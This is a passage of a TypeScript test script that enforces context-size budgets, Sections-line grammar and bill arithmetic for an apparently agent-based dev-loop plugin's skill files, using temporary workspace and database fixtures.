// Context-budget lint + bill math (operator task #8: control the per-fire context size; design
// docs/design/skill-template.md §§5–7). Enforces, per skills/*/SKILL.md: (a) prose (file minus the
// generator-owned cheat-sheet span) within the BUDGETS ceilings — lines AND bytes both bind; (b) the
// cheat block within CHEAT_MAX_LINES; (c) the `Sections:` line grammar + SET-EQUALITY against the
// §-anchors the PROSE actually cites (prose only — the generated cheat blocks cite anchors of their
// own, e.g. §9c in the --blocked-by help line, that not every agent declares); (d) §0/§0a/§2 always
// declared (the §0a boot rule's always-core set). Also warn-ONLY on conventions.md > 200KB with the
// per-section byte listing, and verifies the bill math `dev-loop metrics --context` prints.
// The budget authority is the BUDGETS table in hub/src/context-bill.ts (not the template doc — see
// the note there); lessons budgets stay hub/src/lessons.ts's INDEX_MAX_*/SHARD_MAX_* (cited via
// import by context-bill.ts, deliberately not re-stated here).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdirSync, mkdtempSync, realpathSync, writeFileSync, rmSync, existsSync, readFileSync, readdirSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { CONVENTIONS_BUDGETS } from "../src/context-bill.ts"; // LOOP-238: the conventions ratchet
import { conventionsSlice } from "../src/conventions-verb.ts";
import { loadWorkspace } from "../src/team-config.ts";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import {
  BUDGETS, CHEAT_MAX_LINES, CONVENTIONS_WARN_BYTES, BYTES_PER_TOKEN, type Bill,
  STRATEGY_DOC_READERS,
  citedAnchors, contextBill, conventionsLoad, malformedRefs, measureOf, parseConventions,
  parseSectionsLine, pluginRoot, spanMeasure, splitSkill,
  strategyDocRelPath,
  tryResolveStrategyDocStat,
} from "../src/context-bill.ts";
import { INDEX_MAX_BYTES, INDEX_MAX_LINES, SHARD_MAX_BYTES, SHARD_MAX_LINES, STRATEGY_DOC_MAX_BYTES, STRATEGY_DOC_WARN_FRACTION } from "../src/lessons.ts";
import { checkStrategyDocBudget } from "../src/doctor.ts"; // LOOP-282
import { openDb } from "../src/db.ts";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

const root = pluginRoot();
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// ── 1. Conventions span map sanity (the real file) ────────────────────────────────────────────────
const conv = parseConventions(readFileSync(join(root, "references", "conventions.md"), "utf8"));
ok(conv.anchors.size >= 38, `conventions.md yields the full anchor map (${conv.anchors.size} numbered sections)`);
for (const a of ["0", "0a", "2", "9c", "20a", "21a", "21b", "27"]) ok(conv.anchors.has(a), `anchor §${a} parsed`);
// Progressive disclosure (docs/design/conventions-progressive-disclosure.md): every pointer stub's
// reference file exists and is non-empty — a stub naming a missing file is a silent protocol hole.
for (const f of ["notify.md", "investigation-protocol.md", "backend-service.md", "backend-local.md",
  "reports-linear-sink.md", "ticket-templates.md", "first-run-setup.md", "report-rollups.md"]) {
  const path = join(root, "references", f);
  ok(existsSync(path) && statSync(path).size > 200, `references/${f} exists and is non-empty (stub target)`);
}
// The §16 security doctrine is loaded by every code-committing agent + the heaviest filer (the
// 2026-07 audit found NO committing agent cited it) — regression-guard the four Sections lines.
for (const dir of ["dev-agent", "junior-dev-agent", "senior-dev-agent", "pm-agent"]) {
  const prose16 = splitSkill(readFileSync(join(root, "skills", dir, "SKILL.md"), "utf8")).prose;
  ok(parseSectionsLine(prose16).anchors.includes("16"), `skills/${dir}: §16 security doctrine declared`);
}
// Tiling: preamble + Topology + the ##-level spans cover the file exactly once (no gap, no overlap) —
// a parser bug here silently mis-bills every agent.
const l2 = [...conv.anchors.values()].filter((h) => h.level === 2).map((h) => h.span);
const tiles = [conv.preamble, conv.topology, ...l2].sort((a, b) => a.start - b.start);
let tiled = tiles[0].start === 0 && tiles[tiles.length - 1].end === conv.lines.length - 1;
for (let i = 1; i < tiles.length; i++) if (tiles[i].start !== tiles[i - 1].end + 1) tiled = false;
ok(tiled, "preamble + Topology + ##-level spans tile conventions.md exactly (each line in exactly one)");
// Nesting: every ### lettered child sits inside its ## parent (citing the parent includes it).
for (const [a, h] of conv.anchors) {
  if (h.level !== 3) continue;
  const p = conv.anchors.get(a.replace(/[a-z]$/, ""));
  ok(!!p && h.span.start >= p.span.start && h.span.end <= p.span.end, `§${a} (### child) nests inside §${a.replace(/[a-z]$/, "")}`);
}

// ── 2. Per-SKILL budgets + Sections grammar/set-equality ──────────────────────────────────────────
const skillDirs = readdirSync(join(root, "skills")).filter((d) => statSync(join(root, "skills", d)).isDirectory()).sort();
ok(JSON.stringify(skillDirs) === JSON.stringify(Object.keys(BUDGETS).sort()),
  `BUDGETS covers exactly the skills/ dirs (a new skill needs a budget row in hub/src/context-bill.ts)`);
ok(readFileSync(join(root, "references", "conventions.md"), "utf8").endsWith("\n"),
  "references/conventions.md ends with a newline (the line-based byte accounting is exact)");
for (const dir of skillDirs) {
  const file = `skills/${dir}/SKILL.md`;
  const body = readFileSync(join(root, "skills", dir, "SKILL.md"), "utf8");
  ok(body.endsWith("\n"), `${file}: ends with a newline (the line-based byte accounting is exact)`);
  const { prose, cheat } = splitSkill(body);
  ok(!cheat.some((l) => l.startsWith("Sections:")), `${file}: no 'Sections:' line hides inside the cheat block`);
  const p = measureOf(prose);
  const budget = BUDGETS[dir];
  if (!budget) continue; // already failed above
  ok(p.lines <= budget.lines, `${file}: prose lines within budget (${p.lines} ≤ ${budget.lines})`);
  ok(p.bytes <= budget.bytes, `${file}: prose bytes within budget (${p.bytes} ≤ ${budget.bytes})`);
  if (dir.endsWith("-agent")) {
    ok(cheat.length > 0 && cheat.length <= CHEAT_MAX_LINES,
      `${file}: cheat-sheet block within budget (${cheat.length} ≤ ${CHEAT_MAX_LINES} lines — over? trim the generator, never the budget)`);
  } else {
    ok(cheat.length === 0, `${file}: setup skill carries no cheat-sheet block`);
  }
  const sec = parseSectionsLine(prose);
  ok(sec.errors.length === 0, `${file}: Sections line grammar (exactly one, §<digits><letter?>, unique, ascending)${sec.errors.length ? ` — ${sec.errors[0]}` : ""}`);
  if (sec.errors.length) continue;
  const unresolved = sec.anchors.filter((a) => !conv.anchors.has(a));
  ok(unresolved.length === 0, `${file}: every Sections anchor resolves${unresolved.length ? ` (dangling: ${unresolved.map((a) => "§" + a).join(", ")})` : ""}`);
  for (const a of ["0", "0a", "2"]) ok(sec.anchors.includes(a), `${file}: always-core §${a} declared (§0a boot rule)`);
  const bad = malformedRefs(prose.join("\n"));
  ok(bad.length === 0, `${file}: no malformed §-tokens${bad.length ? ` (${[...new Set(bad)].join(", ")} — invalid anchor or a §9a–c-style range; write members out)` : ""}`);
  const cited = citedAnchors(prose);
  const undeclared = [...cited].filter((a) => !sec.anchors.includes(a));
  const uncited = sec.anchors.filter((a) => !cited.has(a));
  ok(undeclared.length === 0, `${file}: no cited-but-undeclared anchors${undeclared.length ? ` (add to Sections: ${undeclared.map((a) => "§" + a).join(", ")})` : ""}`);
  ok(uncited.length === 0, `${file}: no declared-but-uncited anchors${uncited.length ? ` (drop from Sections: ${uncited.map((a) => "§" + a).join(", ")})` : ""}`);
}

// ── 3. conventions.md size — WARN-only (never fails; the listing tells the editor where the bytes are)
const convTotal = measureOf(conv.lines);
if (convTotal.bytes > CONVENTIONS_WARN_BYTES) {
  console.log(`⚠️  references/conventions.md is ${convTotal.bytes}B / ${convTotal.lines}L — over the ${CONVENTIONS_WARN_BYTES}B warn threshold (warn-only). Per-section bytes:`);
  const listing = [...conv.anchors.entries()]
    .filter(([, h]) => h.level === 2) // ##-level only: children are inside their parent's number
    .map(([a, h]) => ({ a, m: spanMeasure(conv, h.span) }))
    .sort((x, y) => y.m.bytes - x.m.bytes);
  for (const { a, m } of listing) console.log(`    §${a.padEnd(4)} ${String(m.bytes).padStart(6)}B  ${String(m.lines).padStart(4)}L`);
} else {
  console.log(`✅ references/conventions.md within the ${CONVENTIONS_WARN_BYTES}B warn threshold (${convTotal.bytes}B)`);
}

// ── 4. Bill math — synthetic fixture (span semantics are testable without the real file) ──────────
const FIX = [
  "# t", "", "## Table of contents", "intro",
  "## 0. Zero", "z1",
  "### 0a. Boot", "b1", "b2",
  "## Topology at a glance", "t1",
  "## 1. One", "```text", "~~~", "## 5. a heading inside a fence", "```", "o1",
  "## 2. Two", "x",
  "### 2a. TwoA", "y",
  "## 3. Three", "last",
].join("\n") + "\n";
const fx = parseConventions(FIX);
ok(fx.anchors.size === 6 && !fx.anchors.has("5"), `fixture: 6 anchors, the fenced '## 5.' heading is ignored — and the stray ~~~ inside the \`\`\` fence does NOT close it (got ${[...fx.anchors.keys()].join(",")})`);
ok(fx.preamble.start === 0 && fx.preamble.end === 3, "fixture: preamble = title + ToC (lines 0–3)");
ok(fx.anchors.get("0")!.span.end === 8 && fx.anchors.get("0a")!.span.end === 8, "fixture: the Topology heading terminates §0 AND §0a (no double-count of the always-read block)");
ok(fx.topology.start === 9 && fx.topology.end === 10, "fixture: Topology block spans to the next numbered ##");
ok(fx.anchors.get("2")!.span.end === 20 && fx.anchors.get("2a")!.span.start === 19, "fixture: ### child §2a nests inside §2");
const u = conventionsLoad(fx, ["0", "0a", "2", "2a"]); // overlapping citations: §0⊃§0a, §2⊃§2a
ok(u.lines === 4 + 5 + 2 + 4, `fixture: union counts each line once — preamble 4 + §0 5 + Topology 2 + §2 4 = 15 (got ${u.lines})`);
ok(u.bytes === measureOf(fx.lines.slice(0, 11)).bytes + measureOf(fx.lines.slice(17, 21)).bytes, "fixture: union bytes = the covered slices exactly");
let threw = false;
try { conventionsLoad(fx, ["9z"]); } catch { threw = true; }
ok(threw, "fixture: citing a nonexistent anchor throws (the bill never silently under-counts)");

const SKILL_FIX = `---\nname: x\n---\n# X\n\n## BOOT\ncites §0 + §0a and §2.\nSections: §0 §0a §2\n\n<!-- cli-cheatsheet:begin agent=x -->\ncheat cites §18 (excluded from set-equality)\n<!-- cli-cheatsheet:end agent=x -->\n`;
const sf = splitSkill(SKILL_FIX);
ok(sf.cheat.length === 3 && !sf.prose.some((l) => l.includes("§18")), "fixture: splitSkill excludes the marker span (inclusive) from prose");
ok(measureOf(sf.prose).bytes + measureOf(sf.cheat).bytes === Buffer.byteLength(SKILL_FIX), "fixture: prose + cheat bytes sum exactly to the file size");
ok(citedAnchors(sf.prose).size === 3 && parseSectionsLine(sf.prose).errors.length === 0, "fixture: prose citations {0,0a,2} = the Sections set");
ok(parseSectionsLine(["Sections: §2 §0"]).errors.length > 0, "fixture: descending Sections order is a grammar error");
ok(parseSectionsLine(["Sections: §0 §0 §2"]).errors.length > 0, "fixture: duplicate anchor is a grammar error");
ok(parseSectionsLine(["Sections: §0 x §2"]).errors.length > 0, "fixture: a non-anchor token is a grammar error");
ok(parseSectionsLine(["Sections: §0", "Sections: §2"]).errors.length > 0, "fixture: two Sections lines is a grammar error");
ok(parseSectionsLine(["Sections: §12 §12a §13"]).errors.length === 0, "fixture: bare-before-lettered ascending (§12 < §12a < §13) parses clean");
// Marker + citation hardening (codex review 2026-07-12):
threw = false;
try { splitSkill("a\n<!-- cli-cheatsheet:begin agent=x -->\nc\n<!-- cli-cheatsheet:end agent=x -->\n<!-- cli-cheatsheet:begin agent=x -->\n<!-- cli-cheatsheet:end agent=x -->\n"); } catch { threw = true; }
ok(threw, "fixture: duplicate marker pairs throw (never silently mis-measure)");
const mention = splitSkill("prose mentioning cli-cheatsheet:begin markers in a sentence\ncites §3\n");
ok(mention.cheat.length === 0 && mention.prose.length === 2, "fixture: a prose MENTION of the marker text is not a marker (exact full-line match only)");
ok(citedAnchors(["see §12ab and §12A"]).size === 0, "fixture: malformed tokens are never mis-read as shorter valid anchors (§12ab ≠ §12a, §12A ≠ §12)");
ok(JSON.stringify(malformedRefs("see §12ab, §12A and §9a–c")) === JSON.stringify(["§12ab", "§12A", "§9a–c"]),
  "fixture: malformedRefs flags invalid anchors + en-dash range shorthand");
ok(malformedRefs("the §21a-correct tier; loads §9a–§9c; (§12)").length === 0,
  "fixture: hyphen compounds, explicit ranges and punctuation stay legal");

// ── 5. Bill math — the real bill (what `dev-loop metrics --context` prints) ───────────────────────
const bill = contextBill(root);
ok(bill.rows.length === skillDirs.length, `bill has one row per skill (${bill.rows.length})`);
ok(bill.rows.every((r, i) => i === 0 || bill.rows[i - 1].total.bytes >= r.total.bytes), "bill rows sorted by total bytes, descending");
for (const r of bill.rows) {
  // strategyDoc is null in the no-stat call — include it in sum for generality (0 when null)
  const sdBytes = r.strategyDoc?.bytes ?? 0;
  const sdLines = r.strategyDoc?.lines ?? 0;
  const sum = r.prose.bytes + r.cheat.bytes + r.conventions.bytes + r.lessons.bytes + sdBytes;
  ok(r.total.bytes === sum && r.tokens === Math.ceil(sum / BYTES_PER_TOKEN),
    `${r.skill}: total = prose+cheat+conventions+lessons+strategyDoc (${sum}B), ~tokens at ${BYTES_PER_TOKEN}B/token (${r.tokens})`);
  ok(r.total.lines === r.prose.lines + r.cheat.lines + r.conventions.lines + r.lessons.lines + sdLines, `${r.skill}: line total adds up`);
  ok(r.conventions.bytes < bill.conventions.total.bytes,
    `${r.skill}: section-selective boot loads LESS than whole-file conventions (${r.conventions.bytes} < ${bill.conventions.total.bytes}B)`);
  const wantLessons = r.agent ? INDEX_MAX_LINES + SHARD_MAX_LINES : 0;
  ok(r.lessons.lines === wantLessons && r.lessons.bytes === (r.agent ? INDEX_MAX_BYTES + SHARD_MAX_BYTES : 0),
    `${r.skill}: lessons billed at the lessons.ts caps (${r.agent ? "agent: INDEX+shard" : "setup: none"})`);
  ok(r.withinBudget, `${r.skill}: bill row reports within-budget`);
  // strategyDoc is null for all agents when no stat is passed (no workspace in test runner)
  ok(r.strategyDoc === null, `${r.skill}: strategyDoc is null when no stat passed to contextBill()`);
}

// ── 5b. Strategy-doc attribution (LOOP-263) ─────────────────────────────────────────────────────────
// Seeds a known-size stat and verifies it is charged to mandated readers, excluded from others.
// This block MUST FAIL against code that ignores the second contextBill() argument.
{
  const FIXTURE_BYTES = 50_000;
  const FIXTURE_LINES = 1_000;
  const fixtureDoc = { bytes: FIXTURE_BYTES, lines: FIXTURE_LINES, label: "docs/STRATEGY.md" };
  const billWithDoc = contextBill(root, fixtureDoc);

  ok(billWithDoc.rows.length === skillDirs.length, `strategy-doc fixture: bill still has one row per skill`);
  ok(billWithDoc.strategyDoc?.bytes === FIXTURE_BYTES, `strategy-doc fixture: Bill.strategyDoc carries the passed stat`);

  for (const r of billWithDoc.rows) {
    const isReader = STRATEGY_DOC_READERS.has(r.skill);
    const baseBytes = r.prose.bytes + r.cheat.bytes + r.conventions.bytes + r.lessons.bytes;
    const baseLines = r.prose.lines + r.cheat.lines + r.conventions.lines + r.lessons.lines;
    if (isReader) {
      ok(r.strategyDoc !== null && r.strategyDoc.bytes === FIXTURE_BYTES,
        `${r.skill} (reader): strategyDoc field is the fixture stat (LOOP-263)`);
      ok(r.total.bytes === baseBytes + FIXTURE_BYTES,
        `${r.skill} (reader): total includes strategyDoc bytes (${baseBytes}+${FIXTURE_BYTES}) (LOOP-263)`);
      ok(r.total.lines === baseLines + FIXTURE_LINES,
        `${r.skill} (reader): total includes strategyDoc lines (LOOP-263)`);
    } else {
      ok(r.strategyDoc === null,
        `${r.skill} (non-reader): strategyDoc null — not charged the strategy doc (LOOP-263)`);
      ok(r.total.bytes === baseBytes,
        `${r.skill} (non-reader): total unchanged by strategy doc fixture (LOOP-263)`);
    }
  }
}

// ── 5c. strategyDocRelPath unit coverage (LOOP-263 quality gate — CRAP threshold) ────────
// Direct tests for strategyDocRelPath to bring its coverage > 0% (CC=10 → CRAP=110 at 0% cov).
{
  const r = strategyDocRelPath; // alias for readability
  // string cases
  ok(r("docs/STRATEGY.md") === "docs/STRATEGY.md", "strategyDocRelPath: plain repo-relative path");
  ok(r("  docs/STRATEGY.md  ") === "docs/STRATEGY.md", "strategyDocRelPath: trims whitespace");
  ok(r(" \t") === null, "strategyDocRelPath: whitespace-only string → null");
  ok(r("https://linear.app/team/document/abc123") === null, "strategyDocRelPath: Linear URL → null");
  // object cases
  ok(r({ hubDoc: "design/my-design" }) === null, "strategyDocRelPath: hubDoc object → null");
  ok(r({ linearDocument: "doc-id" }) === null, "strategyDocRelPath: linearDocument object → null");
  ok(r({ path: "docs/STRATEGY.md" }) === "docs/STRATEGY.md", "strategyDocRelPath: path object → path string");
  ok(r({ path: "" }) === null, "strategyDocRelPath: path object with empty path → null");
  ok(r({}) === null, "strategyDocRelPath: object without path → null");
  // null/unknown cases
  ok(r(null) === null, "strategyDocRelPath: null → null");
  ok(r(42) === null, "strategyDocRelPath: number → null");
  ok(r(undefined) === null, "strategyDocRelPath: undefined → null");
}

// ── 5d. tryResolveStrategyDocStat integration coverage (LOOP-263 quality gate — CRAP threshold) ────
// Exercises the full function against a temp workspace fixture to bring branch coverage > 23%.
{
  const tmp = join(existsSync("/tmp") ? "/tmp" : "/dev/shm", `context-bill-test-${Date.now()}`);
  const repoDir = "my-repo";
  const repoAbs = join(tmp, repoDir);
  mkdirSync(repoAbs, { recursive: true });
  const fixtureDocRel = "docs/STRATEGY.md";
  const fixtureDocAbs = join(repoAbs, fixtureDocRel);
  mkdirSync(join(repoAbs, "docs"), { recursive: true });
  const FIXTURE_CONTENT = "# Strategy\nline1\nline2\n";
  writeFileSync(fixtureDocAbs, FIXTURE_CONTENT, "utf8");
  const fixtureLines = 3;
  const fixtureBytes = Buffer.byteLength(FIXTURE_CONTENT, "utf8");
  writeFileSync(join(tmp, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    workspaceId: "test-fixture",
    team: { key: "test", backend: "service" },
    repos: { "my-repo": { path: "my-repo" } },
    projects: {
      test: {
        repos: [{ ref: "my-repo" }],
        strategyDoc: fixtureDocRel,
      },
    },
  }), "utf8");
  // 5d-1: file-found path
  const stat = tryResolveStrategyDocStat(tmp);
  ok(stat !== undefined && stat !== null, "tryResolveStrategyDocStat: returns a stat (not undefined)");
  ok(stat!.bytes === fixtureBytes && stat!.lines === fixtureLines,
    `tryResolveStrategyDocStat: stat matches fixture (${stat!.bytes}B/${stat!.lines}L, expected ${fixtureBytes}B/${fixtureLines}L)`);
  ok(stat!.label === fixtureDocRel, `tryResolveStrategyDocStat: label is the relPath (${stat!.label})`);
  // 5d-2: hubDoc form → absent (0 bytes)
  writeFileSync(join(tmp, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    workspaceId: "test-fixture",
    team: { key: "test", backend: "service" },
    repos: { "my-repo": { path: "my-repo" } },
    projects: {
      test: {
        repos: [{ ref: "my-repo" }],
        strategyDoc: { hubDoc: "design/my-design" },
      },
    },
  }), "utf8");
  const hubStat = tryResolveStrategyDocStat(tmp);
  ok(hubStat?.bytes === 0 && hubStat?.lines === 0, "tryResolveStrategyDocStat: hubDoc form → 0 bytes (absent)");
  ok(hubStat!.label.includes("hubDoc"), "tryResolveStrategyDocStat: hubDoc form label mentions 'hubDoc'");
  // 5d-3: linearDocument form → absent (0 bytes)
  writeFileSync(join(tmp, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    workspaceId: "test-fixture",
    team: { key: "test", backend: "service" },
    repos: { "my-repo": { path: "my-repo" } },
    projects: {
      test: {
        repos: [{ ref: "my-repo" }],
        strategyDoc: { linearDocument: "doc-123" },
      },
    },
  }), "utf8");
  const linStat = tryResolveStrategyDocStat(tmp);
  ok(linStat?.bytes === 0 && linStat?.label.includes("linearDoc"), "tryResolveStrategyDocStat: linearDocument form → absent");
  // 5d-4: absent file → absent (0 bytes)
  writeFileSync(join(tmp, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    workspaceId: "test-fixture",
    team: { key: "test", backend: "service" },
    repos: { "my-repo": { path: "my-repo" } },
    projects: {
      test: {
        repos: [{ ref: "my-repo" }],
        strategyDoc: "docs/NONEXISTENT.md",
      },
    },
  }), "utf8");
  const notFound = tryResolveStrategyDocStat(tmp);
  ok(notFound?.bytes === 0 && notFound?.label.includes("not found"), "tryResolveStrategyDocStat: missing file → absent");
  // 5d-5: no strategyDoc at all → loop falls through → undefined
  writeFileSync(join(tmp, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    workspaceId: "test-fixture",
    team: { key: "test", backend: "service" },
    repos: { "my-repo": { path: "my-repo" } },
    projects: {
      test: { repos: [{ ref: "my-repo" }] },
    },
  }), "utf8");
  ok(tryResolveStrategyDocStat(tmp) === undefined, "tryResolveStrategyDocStat: no strategyDoc → undefined");
  // 5d-6: no workspace → undefined
  const noWs = tryResolveStrategyDocStat("/tmp/nonexistent-dir-12345");
  ok(noWs === undefined, "tryResolveStrategyDocStat: no workspace → undefined");
  // Cleanup
  rmSync(tmp, { recursive: true, force: true });
}

// ── 5e. LOOP-355 AC5 regression: hub-doc project reads real bytes from hub.db (AC1) ──────
// FAILS against code that returns 0 for hubDoc (the old behaviour),
// or that reads the wrong project's doc in a multi-project workspace (AC3).
{
  const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-hubdoc-test-")));
  try {
    const repoDir = join(tmp, "repo");
    mkdirSync(join(tmp, ".dev-loop"), { recursive: true });
    mkdirSync(repoDir, { recursive: true });

    // Seed hub.db with a strategy doc for project 'test'
    const db = openDb(join(tmp, ".dev-loop", "hub.db"));
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p1','test','Test','2026-01-01T00:00:00.000Z')").run();
    db.prepare("INSERT INTO documents(id,project_id,slug,kind,title,created_by,current_version,created_at,updated_at) VALUES('d1','p1','my-strategy','strategy','Test Strategy','junior-dev',1,'2026-01-01T00:00:00.000Z','2026-01-01T00:00:00.000Z')").run();
    const HUB_DOC_BODY = "# Strategy\nline1\nline2\nline3\n";
    db.prepare("INSERT INTO document_versions(id,doc_id,version,body,author,created_at) VALUES('v1','d1',1,?,'junior-dev','2026-01-01T00:00:00.000Z')").run(HUB_DOC_BODY);
    db.close();

    writeFileSync(join(tmp, "dev-loop.json"), JSON.stringify({
      schemaVersion: 2,
      workspaceId: "hubdoc-test",
      team: { key: "test", backend: "service" },
      repos: { repo: { path: "repo" } },
      projects: { test: { repos: [{ ref: "repo" }], strategyDoc: { hubDoc: "my-strategy" } } },
    }));

    const stat = tryResolveStrategyDocStat(tmp);
    const expectedBytes = Buffer.byteLength(HUB_DOC_BODY, "utf8");
    ok(stat !== null && stat !== undefined, "AC5 hubDoc: returns a stat");
    ok(stat!.bytes === expectedBytes, `AC5 hubDoc: billed at real size (${stat!.bytes}B, expected ${expectedBytes}B) — FAILS against old code that returned 0`);
    ok(stat!.lines === 4, `AC5 hubDoc: billed at real line count (${stat!.lines}, expected 4)`);
    ok(stat!.label.includes("hubDoc") && stat!.label.includes("test"), `AC5 hubDoc: label references hubDoc and the project key (${stat!.label})`);

    // Also test with projectKey parameter
    const statWithKey = tryResolveStrategyDocStat(tmp, "test");
    ok(statWithKey?.bytes === expectedBytes, "AC5 hubDoc: projectKey parameter resolves the same doc");
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
}

// ── 5f. LOOP-355 AC5 regression: multi-project workspace (AC3) ────────────────────────────────
// FAILS against the old code that returns Object.keys()[0] regardless of the requested project.
{
  const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-multi-proj-test-")));
  try {
    const repoDir = join(tmp, "repo");
    mkdirSync(repoDir, { recursive: true });
    mkdirSync(repoDir, { recursive: true });

    // Two repo files as strategy docs for two projects
    mkdirSync(join(repoDir, "docs"), { recursive: true });
    writeFileSync(join(repoDir, "docs", "STRATEGY-A.md"), "# Project A Strategy\n".repeat(10), "utf8");
    writeFileSync(join(repoDir, "docs", "STRATEGY-B.md"), "# Project B Strategy\n".repeat(20), "utf8");

    writeFileSync(join(tmp, "dev-loop.json"), JSON.stringify({
      schemaVersion: 2,
      workspaceId: "multi-proj-test",
      team: { key: "test", backend: "service" },
      repos: { repo: { path: "repo", owner: "proja" } },
      projects: {
        proja: { repos: [{ ref: "repo" }], strategyDoc: "docs/STRATEGY-A.md" },
        projb: { repos: [{ ref: "repo" }], strategyDoc: "docs/STRATEGY-B.md" },
      },
    }));

    // With projectKey, resolves only that project's doc
    const statA = tryResolveStrategyDocStat(tmp, "proja");
    const statB = tryResolveStrategyDocStat(tmp, "projb");
    ok(statA !== undefined, "AC5 multi: statA resolves");
    ok(statB !== undefined, "AC5 multi: statB resolves");
    ok(statA!.label.includes("STRATEGY-A.md"), `AC5 multi: statA label mentions project A (${statA!.label})`);
    ok(statB!.label.includes("STRATEGY-B.md"), `AC5 multi: statB label mentions project B (${statB!.label})`);
    // The file sizes differ by ~2x, so the byte counts MUST differ
    ok(statA!.bytes !== statB!.bytes, `AC5 multi: project docs have different sizes (A=${statA!.bytes}B vs B=${statB!.bytes}B) — FAILS if both read the same doc`);
    // Also verify we get the right size for the right project:
    ok(statA!.bytes === Buffer.byteLength("# Project A Strategy\n".repeat(10), "utf8"), `AC5 multi: statA bytes = project A doc (${statA!.bytes})`);
    ok(statB!.bytes === Buffer.byteLength("# Project B Strategy\n".repeat(20), "utf8"), `AC5 multi: statB bytes = project B doc (${statB!.bytes})`);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
}

// ── 5g. LOOP-355 AC5: repo-file single-project workspace (AC4 — byte-identical) ──────────────
// This is guaranteed by 5d-1 above (unchanged code path for repo files).
// The existing 5d-1 test already passes; this just states AC4 as covered.
ok(true, "AC5 repo-file single: covered by 5d-1 above (the code path is unchanged)");

// ── 6. CLI e2e: `metrics --context` needs NO workspace (plugin-static; the doctor/metrics call) ────
const r = spawnSync(process.execPath, [join(root, "hub", "src", "metrics.ts"), "--context", "--json"],
  { cwd: "/", env: { ...scrubFireEnv(), DEVLOOP_HOME: undefined as unknown as string }, encoding: "utf8" });
ok(r.status === 0, `metrics --context exits 0 outside any workspace (got ${r.status}: ${(r.stderr ?? "").slice(0, 120)})`);
let cliBill: Bill | null = null;
try { cliBill = JSON.parse((r.stdout ?? "").trim()) as Bill; } catch { /* fails below */ }
ok(!!cliBill && cliBill.rows.length === bill.rows.length && cliBill.rows[0].skill === bill.rows[0].skill
  && cliBill.rows[0].total.bytes === bill.rows[0].total.bytes,
  "metrics --context --json prints the same bill the library computes");
const human = spawnSync(process.execPath, [join(root, "hub", "src", "metrics.ts"), "--context"], { cwd: "/", encoding: "utf8" });
ok(human.status === 0 && /per-agent per-fire context bill/.test(human.stdout ?? "") && /PROSE BUDGET/.test(human.stdout ?? ""),
  "metrics --context human render prints the bill table");

// ── LOOP-238: the CONVENTIONS ratchet — a landed compression win cannot silently regrow ──────────
// BUDGETS above bounds an agent's own SKILL prose. This bounds the far larger input: the
// config-pruned §0a conventions slice its fire receives. Conventions is 75% of context at a measured
// $4.79/fire (LOOP-228), and it had NO failing gate at all — which is how 20 rollup passes failed to
// bound it. A win that is not ratcheted is a moment, not a change.
{
  const root = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
  // A synthetic workspace, for the reason LOOP-237's suite learned the hard way: the prune is
  // config-decided, so measuring against whatever workspace happens to resolve makes the number mean
  // something different on every host — and on CI, where nothing resolves, everything prunes.
  const wsRoot = realpathSync(mkdtempSync(join(tmpdir(), "dl-ratchet-")));
  mkdirSync(join(wsRoot, "repo"), { recursive: true });
  writeFileSync(join(wsRoot, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    team: { key: "ratchet", backend: "service" },
    repos: { repo: { path: "repo", landing: "pr", autoMerge: true } },
    projects: { p: { repos: [{ ref: "repo", role: "primary" }] } },
  }));
  try {
    const ws = loadWorkspace(wsRoot);
    // AC1 — coverage: exactly the loop agents, no missing row and no extra one. Mirrors the BUDGETS
    // coverage lint; without it a new agent ships unbounded and nobody notices.
    const LOOP_AGENTS = ["pm", "qa", "senior-dev", "junior-dev", "sweep", "reflect", "ops", "architect", "communication"];
    const rows = Object.keys(CONVENTIONS_BUDGETS).sort();
    ok(rows.join(",") === [...LOOP_AGENTS].sort().join(","),
      `LOOP-238 AC1: CONVENTIONS_BUDGETS covers exactly the loop agents (missing: ${LOOP_AGENTS.filter((a) => !rows.includes(a)).join(",") || "none"}; extra: ${rows.filter((a) => !LOOP_AGENTS.includes(a)).join(",") || "none"})`);

    // AC2 — every agent is AT OR UNDER its row today. This is the assertion that fails the moment a
    // conventions edit regrows a slice past its ceiling.
    let over = 0;
    for (const a of LOOP_AGENTS) {
      const bytes = conventionsSlice(root, a, ws, "p").bytes;
      const budget = CONVENTIONS_BUDGETS[a];
      if (bytes > budget) { over++; console.log(`   ${a}: ${bytes} B > ${budget} B`); }
    }
    ok(over === 0, `LOOP-238 AC2: every agent's pruned conventions slice is within its ratchet (${over} over)`);

    // …and the headroom is THIN. A ratchet with generous slack does not ratchet — it records a
    // number nobody trips. Assert each row is within 2 KB of the actual, or the gate is decorative.
    let slack = 0;
    for (const a of LOOP_AGENTS) {
      const bytes = conventionsSlice(root, a, ws, "p").bytes;
      if (CONVENTIONS_BUDGETS[a] - bytes > 2048) { slack++; console.log(`   ${a}: ${CONVENTIONS_BUDGETS[a] - bytes} B of slack`); }
    }
    ok(slack === 0, `LOOP-238: …with THIN headroom — a ratchet with slack records a number nobody trips (${slack} row(s) over 2 KB of slack)`);

    // AC3 — the gate FAILS CLOSED on a deliberate over-budget fixture. Without this the check above
    // is indistinguishable from one that can never fail.
    {
      const pm = conventionsSlice(root, "pm", ws, "p").bytes;
      const tightened: Record<string, number> = { ...CONVENTIONS_BUDGETS, pm: pm - 1 };
      const wouldFail = LOOP_AGENTS.filter((a) => conventionsSlice(root, a, ws, "p").bytes > tightened[a]);
      ok(wouldFail.length === 1 && wouldFail[0] === "pm",
